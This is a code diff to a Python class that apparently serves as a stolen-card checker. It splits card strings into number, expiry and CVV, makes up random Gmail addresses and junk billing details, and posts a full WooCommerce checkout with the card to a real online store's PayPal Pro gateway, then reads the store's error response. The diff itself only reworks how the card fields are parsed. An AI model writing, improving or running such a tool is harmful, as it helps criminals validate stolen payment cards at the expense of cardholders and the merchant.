@@ -23,11 +23,14 @@ def paserX(data, first, last):
 class payflowwo:
     def __init__(self, tarjeta):
         try:
-            self.card = tarjeta
-            self.ccs = tarjeta.split('|')
-            if self.ccs[0].startswith("4"): self.brand = "VI"
-            if self.ccs[0].startswith("3"): self.brand = "AE"
-            elif self.ccs[0].startswith("5"): self.brand = "MC"
+            partes = tarjeta.split("|")
+        
+            self.tarjeta = tarjeta
+            if len(partes) == 4:
+                self.cc = partes[0]
+                self.mes = partes[1]
+                self.ano = partes[2]
+                self.cvv = partes[3]
             def generar_correo():
                 return f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
             CorreoRand = generar_correo()
@@ -261,7 +264,7 @@ class payflowwo:
                 'wc-ajax': 'checkout',
             }
 
-            data = f'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fpolytechamerica.com%2Fproduct%2Fextension-cord-organizer%2F&wc_order_attribution_session_start_time=2026-04-19+04%3A31%3A54&wc_order_attribution_session_pages=46&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F146.0.0.0+Safari%2F537.36&billing_first_name=ldfl&billing_email={CorreoRand}&billing_last_name=dsdasd&billing_company=ggd&billing_contact_email={CorreoRand}&billing_country=US&billing_address_1=128+Blacks+Road&billing_address_2=sadw&billing_postcode=06410&billing_city=Cheshire&billing_state=CT&billing_phone=%2B10989861371&billing_landline_phone=&ups_account_number=&ups_account_zipcode=&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=&shipping_address_1=&shipping_address_2=&shipping_postcode=&shipping_city=&shipping_state=&order_comments=&shipping_method%5B0%5D=wf_shipping_ups%3A03&payment_method=paypalpro&billing_credircard={self.ccs[0]}&billing_cardtype=Visa&billing_expdatemonth={self.ccs[1]}&billing_expdateyear={self.ccs[2]}&billing_ccvnumber={self.ccs[3]}&woocommerce-process-checkout-nonce={checkout_nonce}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review'
+            data = f'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fpolytechamerica.com%2Fproduct%2Fextension-cord-organizer%2F&wc_order_attribution_session_start_time=2026-04-19+04%3A31%3A54&wc_order_attribution_session_pages=46&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F146.0.0.0+Safari%2F537.36&billing_first_name=ldfl&billing_email={CorreoRand}&billing_last_name=dsdasd&billing_company=ggd&billing_contact_email={CorreoRand}&billing_country=US&billing_address_1=128+Blacks+Road&billing_address_2=sadw&billing_postcode=06410&billing_city=Cheshire&billing_state=CT&billing_phone=%2B10989861371&billing_landline_phone=&ups_account_number=&ups_account_zipcode=&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=&shipping_address_1=&shipping_address_2=&shipping_postcode=&shipping_city=&shipping_state=&order_comments=&shipping_method%5B0%5D=wf_shipping_ups%3A03&payment_method=paypalpro&billing_credircard={self.cc}&billing_cardtype=Visa&billing_expdatemonth={self.mes}&billing_expdateyear={self.ano}&billing_ccvnumber={self.cvv}&woocommerce-process-checkout-nonce={checkout_nonce}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review'
 
             response = self.session.post('https://polytechamerica.com/', params=params, headers=headers, data=data).text
             err = paserX(response, 'class=\\"woocommerce-error\\" role=\\"alert\\">\\n\\t\\t\\t<li>\\n\\t\\t\\t', '\\t\\t<\\/li>\\n\\t\\t\\t<li>\\n\\t\\t\\t(Transaction Error) something is wrong.\\t\\t<\\/li>\\n\\t<\\/ul>\\n')
